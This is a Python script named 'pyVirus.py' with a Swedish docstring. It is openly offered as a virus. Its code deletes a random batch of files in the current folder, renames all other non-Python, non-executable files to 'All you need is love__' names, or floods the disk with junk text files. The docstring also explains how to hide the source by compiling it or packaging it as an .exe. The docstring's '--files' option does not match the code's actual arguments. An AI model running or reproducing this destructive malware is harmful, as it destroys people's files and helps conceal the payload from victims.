#!/usr/bin/env python
"""
pyVirus.py av Stefan Blecko. Version 0.4, 2021

Skriptet gör 3 saker.

1. Skriptet ändrar filnamnet på alla filer (förutom på PY och EXE-filer samt mappar)
   till "All you need is love__" + ett hexadecimalt tal mellan 11111 och 99999.
   Filändelsen ändras inte.
2. Skriptet radarar slumpmässigt mellan 5-50 filer varje gång det körs. PY,
   EXE-filer samt mappar raderas inte.
3. Skriptet genererar, slumpmässigt och automatiskt x antal textfiler
   med slumpmässigt innehåll på hårddisken. Man kan själv definiera
   hur många skräpfiler som ska skapas genom att skriva (från PowerShell):
   python pyVirus.py (skapar en fil)
   python pyVirus.py --files 340 (skapar 340 filer)
   python pyVirus.py --files 1000000 (skapar EN MILJON filer)
   python pyVirus.py -h (visar hjälp)

Vill man dölja källkoden kan man skapa en sk "compiled Python file".
Starta python.exe/ipython.exe och skriv:

import py_compile
py_compile.compile('pyVirus.py', optimize=-1)

Vill man hellre skapa en .exe fil av skriptet så kan man göra så här
(från PowerShell):

pip install pyinstaller
pyinstaller --onefile pyVirus.py
"""

import random
import argparse
import pathlib


def filename_generator1():
    return f"{str(random.random())[2:]}" + ".txt"

def filename_generator2():
    return f"All you need is love__{str(hex(random.randrange(11111, 99999)))}"

def math_symbols():
    special_char = [
        "+", "-", "*", "÷", "%", "‰", "(", ")", "±", "≡", "=", "≈", "<", ">", "≥",
        "≤", "√", "ⁿ", "¹", "²", "³", "π", "°", "#", "∞", "µ", "Σ", "∩", "⌠", "⌡"]
    return random.choice(special_char)

def mystic_message():
    return "i can feel something wonderful is happening i'm alive"

def junkfile_generator():
    special_char_array = []
    for spch in range(1, 2500):
        special_char_array.append(math_symbols())
    special_char_array.append(mystic_message())
    random.shuffle(special_char_array)
    return special_char_array

def number_of_files():
    return random.randrange(5, 50)

def directory():
    p = pathlib.Path('.')
    return p.iterdir()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--generate_junk_files", default=1)
    parser.add_argument("--random_delete", action="store_true")
    parser.add_argument("--rename_files", action="store_true")
    args = parser.parse_args()

    if args.random_delete:
        for n in range(1, number_of_files()):
            rnd_pick = random.choice(list(directory()))
            if rnd_pick.suffix == ".exe" or rnd_pick.suffix == ".py":
                pass
            elif rnd_pick.is_dir():
                pass
            else:
                print(rnd_pick, "[Raderad]")
                rnd_pick.unlink()

    elif args.rename_files:
        for item in list(directory()):
            if item.suffix == ".exe" or item.suffix == ".py":
                pass
            elif item.is_dir():
                pass
            else:
                print(item, "[Ändrad]")
                item.rename(f"{filename_generator2()}" + f"{item.suffix}")

    else:
        for n in range(0, int(args.generate_junk_files)):
            with open(filename_generator1(), "x", encoding="UTF-8") as f:
                for item in junkfile_generator():
                    f.write("".join(item))
            f.close()


if __name__ == "__main__":
    main()
